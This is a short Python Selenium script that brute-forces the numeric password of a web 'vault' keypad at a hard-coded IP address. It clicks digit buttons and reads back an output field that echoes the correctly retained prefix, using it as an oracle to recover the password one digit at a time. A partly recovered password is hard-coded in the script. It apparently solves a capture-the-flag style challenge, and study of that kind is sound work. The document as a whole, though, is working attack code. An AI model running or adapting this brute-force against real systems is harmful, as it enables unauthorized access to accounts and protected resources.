from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# URL of the vault
URL = "http://52.76.13.43:8148/"

# Digits to try
DIGITS = "0123456789"

# Set up the WebDriver (ensure you have the appropriate driver)
driver = webdriver.Edge()
driver.get(URL)

# Function to simulate clicking a button
def click_button(digit):
    try:
        button = driver.find_element(By.XPATH, f"//button[text()='{digit}']")
        button.click()
        time.sleep(0.05)  # Wait for the page to update
    except Exception as e:
        print(f"Error clicking button {digit}: {e}")

# Function to get the retained password so far
def get_retained_password():
    try:
        output_data = driver.find_element(By.ID, 'output_data')
        return output_data.text.strip()
    except Exception as e:
        print(f"Error fetching retained password: {e}")
        return ''

# Function to find the password digit by digit
def find_password():
    # password = ''
    password = '8438261782173952'
    while True:
        found = False
        for digit in DIGITS:
            print(f"Trying: {password + digit}")

            # Key in the password so far (digit by digit)
            trial = password + digit
            for d in trial:
                click_button(d)

            result = get_retained_password()

            if result == trial:
                print(f"[+] Correct digit: {digit} => {result}")
                password += digit
                found = True
                break

        if not found:
            print(f"[✓] Password complete: {password}")
            break
        
# Start the password finding process
find_password()

# Close the browser once done
driver.quit()
